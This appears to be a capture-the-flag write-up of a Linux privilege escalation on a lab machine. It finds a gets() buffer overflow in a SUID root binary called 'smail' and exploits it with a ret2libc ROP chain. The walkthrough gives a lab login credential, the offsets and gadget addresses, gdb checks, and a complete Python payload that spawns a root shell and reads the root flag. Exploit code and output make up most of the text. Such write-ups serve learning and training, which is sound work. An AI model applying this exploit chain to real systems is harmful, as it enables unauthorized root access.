### Priv Esc

**prerequisites - login as user carlJ using `carlJ:Pas$w0RD59247` on machine.**

**After logging in there is a `mailing` dir in home with a single binary `smail`. Check the perms first.**

```
carlJ@incognito:~/mailing$ ls -ali

    97 drwx------ 2 carlJ carlJ 4096 Apr 16  2021 .
295106 drwxr-xr-x 8 carlJ carlJ 4096 Jun 11  2021 ..

```

**Owner is root and the SUID bit is set (the `s`). So it always runs as root no matter who launches it. If we can hijack it we get a root shell, that's the whole target.**

**Run it, it's a little mail menu. Option 1 sends a message, option 2 changes your signature.**

```
carlJ@incognito:~/mailing$ ./smail
What do you wanna do
1-Send Message
2-Change your Signature
2
Write your signature...
asdfasdfasdf
Changed
```

**Pulled the binary into my linux, fired up ghidra and found the buffer overflow in 2-Change your Signature, this `sig()`:**

```
void sig(void)
{
  char local_48 [64];
  gets(local_48);
  puts("Changed");
  return;
}
```

<!-- ghidra decompiled view of sig() -->
<br>

**`local_48` is a 64 byte buffer and it's read with `gets()`, and `gets` has no size limit, it just reads until a newline. So we can hand it way more than 64 bytes and it spills past the buffer. That's our overflow.**

**So picture what that gets us. The buffer lives on the stack and right above it is the saved RBP and then the saved return address. When we overflow far enough we run over that return address, and the moment `sig()` returns the CPU jumps to whatever we put there. So we control execution, the question is just where to point it.**

```
   higher addr  ┌────────────────────┐
                │  saved RET (RIP)   │  <- overflow reaches here, ret jumps to it
                ├────────────────────┤
                │  saved RBP         │
                ├────────────────────┤
   lower addr   │  local_48 [64]     │  <- gets() writes HERE, spills upward
                └────────────────────┘
```

**On linux the stack is non-executable, so unlike a windows box we can't just dump shellcode into the buffer and jump to it. Instead we do ret2libc - libc already contains the `system()` function and the string `/bin/sh`, we just borrow them. On 64-bit the first argument to a function goes in the RDI register, so `system("/bin/sh")` means we need RDI pointing at `/bin/sh` before we call system. To set RDI we use a tiny gadget `pop rdi ; ret` that already exists in libc. So the plan for what we overwrite the return address with is:**

```
   [ padding to the return address ]
   [ pop rdi ; ret ]   -> loads the next value on the stack into RDI
   [ &"/bin/sh"    ]   -> that value, ends up in RDI
   [ ret           ]   -> one extra ret to keep the stack aligned
   [ &system       ]   -> now runs system("/bin/sh")
```

**And because the binary is SUID root, that `/bin/sh` comes back as root.**

**So to actually build this we need a few things - how many bytes of padding until we hit the return address, and the real addresses of `system`, the `/bin/sh` string and the `pop rdi ; ret` gadget. On top of that we need to know if ASLR is on, because if libc gets loaded at a random spot each run we can't hardcode those addresses. Let's go check all of it.**

**First what the binary links against and the mitigations.**

```
carlJ@incognito:~/mailing$ ldd smail
        linux-vdso.so.1 (0x00007ffff7ffa000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e2000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd3000)

carlJ@incognito:~/mailing$ cat /proc/sys/kernel/randomize_va_space
0
carlJ@incognito:~/mailing$ readelf -Ws smail | grep __stack_chk_fail
carlJ@incognito:~/mailing$ readelf -h smail | grep Type
  Type:                              EXEC (Executable file)
```

**This is about as friendly as it gets. `randomize_va_space` is 0 so ASLR is off - libc loads at `0x7ffff79e2000` every single run and we can hardcode addresses with no leak. The `__stack_chk_fail` grep comes back empty so there's no stack canary to worry about smashing. And it's `EXEC` not PIE so the binary base is fixed too.**

**Now the padding length. The buffer is at `rbp-0x40` (from the disasm), that's 64 bytes to the saved RBP plus 8 more for the saved RBP itself, so `0x40 + 8 = 72` bytes to reach the return address. Confirm it with 72 A's and 8 B's under gdb.**

```
carlJ@incognito:~/mailing$ python3 -c 'import sys; sys.stdout.buffer.write(b"2\n"+b"A"*72+b"BBBBBBBB\n")' > /tmp/t
carlJ@incognito:~/mailing$ gdb -q -batch -ex 'run < /tmp/t' -ex 'i r rip rbp' ./smail
Program received signal SIGSEGV, Segmentation fault.
0x00000000004006de in sig ()
rip            0x4006de   0x4006de <sig+39>
rbp            0x4141414141414141   0x4141414141414141
```

**RBP is full of our A's and it dies right on the `retq`, so 72 bytes lands us exactly on the return address.**

**Now grab the three addresses. libc base is `0x7ffff79e2000` and everything is base + offset.**

```
carlJ@incognito:~/mailing$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep ' system@@'
  1403: 000000000004f550    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5

carlJ@incognito:~/mailing$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'
 1b3e1a /bin/sh

carlJ@incognito:~/mailing$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep ': pop rdi ; ret'
0x00000000000215bf : pop rdi ; ret
```

**So `system` is base+`0x4f550`, `/bin/sh` is base+`0x1b3e1a`, the `pop rdi ; ret` gadget is base+`0x215bf`, and the bare `ret` for alignment is base+`0x215c0` (the ret right after that pop).**

**One thing on actually delivering the payload. The menu is read with scanf, and when stdin is a plain pipe stdio slurps the whole input in one buffered read, so any commands you tack on after the payload get eaten before the shell even spawns and it dies on EOF. So send the payload, then keep your terminal attached with `cat` and type the commands live. Also don't try to paste the payload by hand, the addresses contain bytes like `0x00` and `0x1a` that the terminal mangles, python has to write the raw bytes into the pipe.**

```
(python3 -c '
import sys, struct
base  = 0x7ffff79e2000
p     = lambda x: struct.pack("<Q", x)
POP   = base + 0x215bf   # pop rdi ; ret
BINSH = base + 0x1b3e1a  # "/bin/sh"
RET   = base + 0x215c0   # ret (stack align)
SYS   = base + 0x4f550   # system
buf  = b"2\n"                        # menu -> option 2
buf += b"A"*72                       # padding to the return address
buf += p(POP) + p(BINSH) + p(RET) + p(SYS)
buf += b"\n"
sys.stdout.buffer.write(buf)
'; cat) | ./smail
```

**Screen looks frozen after it runs but that's the root shell sitting there waiting, just type into it.**

```

1-Send Message
2-Change your Signature
Write your signature...
Changed
id
uid=0(root) gid=1002(carlJ) groups=1002(carlJ)
cat /root/root.txt
f21979de76c0302154cc001884143ab2
```
